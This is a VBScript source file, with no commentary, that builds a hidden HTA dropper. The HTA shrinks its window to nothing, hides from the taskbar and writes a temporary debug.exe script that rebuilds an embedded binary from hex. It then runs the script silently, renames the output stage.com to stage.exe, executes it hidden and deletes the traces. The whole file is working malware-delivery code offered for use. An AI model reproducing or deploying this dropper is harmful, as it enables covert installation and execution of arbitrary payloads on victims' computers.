Option Explicit
Dim fso, rawBytes, outHta, k, addrHex, byteRow

Set fso = CreateObject("Scripting.FileSystemObject")

Sub EmitDropperFromBuffer(buf, destPath)
    Set outHta = fso.CreateTextFile(destPath, True)
    outHta.WriteLine "<html><head>"
    outHta.WriteLine "<hta:application id=""ldr"" width=""0"" height=""0"" showintaskbar=""no"">"
    outHta.WriteLine "<script language=""JavaScript"">window.resizeTo(0,0);</script>"
    outHta.WriteLine "<script language=""VBScript"">"
    outHta.WriteLine "Set fs = CreateObject(""Scripting.FileSystemObject"")"
    outHta.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
    outHta.WriteLine "scr = fs.GetSpecialFolder(2) & ""\"" & fs.GetTempName"
    outHta.WriteLine "Set s = fs.CreateTextFile(scr, True)"

    For k = 1 To (LenB(buf) \ 16)
        addrHex = Hex((k - 1) * 16 + 256)
        byteRow = ByteSliceToHex(buf, (k - 1) * 16 + 1, 16)
        outHta.WriteLine "s.WriteLine ""e " & addrHex & " " & byteRow & """"
    Next

    outHta.WriteLine "s.WriteLine ""rcx"""
    outHta.WriteLine "s.WriteLine """ & Hex(LenB(buf)) & """"
    outHta.WriteLine "s.WriteLine ""n stage.com"""
    outHta.WriteLine "s.WriteLine ""w"""
    outHta.WriteLine "s.WriteLine ""q"""
    outHta.WriteLine "s.Close"
    outHta.WriteLine "sh.Run ""cmd.exe /c debug.exe < "" & scr, 0, 1"
    outHta.WriteLine "fs.CopyFile ""stage.com"", ""stage.exe"", True"
    outHta.WriteLine "sh.Run ""stage.exe"", 0, 0"
    outHta.WriteLine "fs.DeleteFile scr, True"
    outHta.WriteLine "</script></head><body></body></html>"
    outHta.Close
End Sub

Function ByteSliceToHex(b, pos, count)
    Dim idx, v, res
    res = ""
    For idx = pos To pos + count - 1
        v = Hex(AscB(MidB(b, idx, 1)))
        If Len(v) < 2 Then v = "0" & v
        res = res & v & " "
    Next
    ByteSliceToHex = Trim(res)
End Function
